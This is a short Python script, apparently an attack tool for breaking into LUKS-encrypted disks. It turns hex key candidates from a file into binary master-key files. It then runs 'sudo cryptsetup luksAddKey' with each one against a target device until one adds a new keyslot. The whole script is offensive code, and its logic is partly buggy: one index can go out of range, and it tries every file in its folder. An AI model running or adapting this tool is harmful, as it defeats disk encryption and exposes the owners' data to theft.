#!/usr/bin/python3
import binascii
import os
import sys
from subprocess import run


def generate():
    with open('keys') as f_in:
        lines = f_in.readlines()
        for i in range(1, len(lines), 2):
            if i+1 < len(lines):
                p1 = lines[i].rstrip().replace(" ", "")
                p2 = lines[i+2].rstrip().replace(" ", "")
                chunk = binascii.unhexlify(p2+p1)
                with open(f"key{i}.bin", 'wb') as f_out:
                    f_out.write(chunk)
                    f_out.close()
        f_in.close()


def penetrate():
    file_path = os.path.dirname(os.path.abspath(__file__))
    for file in os.listdir(file_path):
        p = run(['sudo', 'cryptsetup', 'luksAddKey', f'{device}', '--master-key-file', f'{file}'])
        if p.returncode == 0:
            exit()


if __name__ == '__main__':
    if len(sys.argv) > 1:
        device = sys.argv[1]
    else:
        print("Device argument missing")
        exit(1)
    generate()
    penetrate()
